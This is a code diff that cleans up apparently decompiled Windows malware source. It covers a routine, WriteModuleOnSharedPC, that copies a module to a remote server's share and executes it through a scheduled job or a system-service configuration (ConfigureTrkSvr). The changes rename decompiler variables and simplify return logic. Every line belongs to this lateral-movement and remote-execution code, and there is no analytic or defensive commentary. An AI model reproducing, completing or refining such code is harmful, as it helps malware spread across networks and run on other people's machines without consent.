@@ -52,9 +52,8 @@ bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 	int v32; // [sp-4h] [bp-12D0h]@12
 	int v33; // [sp+10h] [bp-12BCh]@6
 	int v36; // [sp+20h] [bp-12ACh]@1
-	bool v38; // [sp+27h] [bp-12A5h]@4
 	WCHAR v39[1024]; // [sp+28h] [bp-12A4h]@11
-	WCHAR v40[256]; // [sp+828h] [bp-AA4h]@10
+
 	WCHAR NewFileName[256]; // [sp+A28h] [bp-8A4h]@11
 
 	WCHAR csrss_dir[256];
@@ -116,13 +115,15 @@ bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 	if( !success )
 		return false;
 	
-	strcpyW(v40, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
-	strcpyW(&v40[strlenW(L"%SystemRoot%\\System32\\")], exec_name, 2 * strlenW(exec_name) + 2);
 	
-	if(AddNewJob(remoteSrv, v40))
+	WCHAR defaultPath[256]; // [sp+828h] [bp-AA4h]@10
+
+	strcpyW(defaultPath, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
+	strcpyW(&defaultPath[strlenW(L"%SystemRoot%\\System32\\")], exec_name, 2 * strlenW(exec_name) + 2);
+	
+	if(AddNewJob(remoteSrv, defaultPath))
 	{
-		v38 = 1;
-		return v38;
+		return true;
 	}
 	
 	AddNewJob(remoteSrv, exec_name);
@@ -147,8 +148,7 @@ bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 	
 	if(ConfigureTrkSvr(remoteSrv, v39))
 	{
-		v38 = 1;
-		return v38;
+		return true;
 	}
 	
 	return 0;
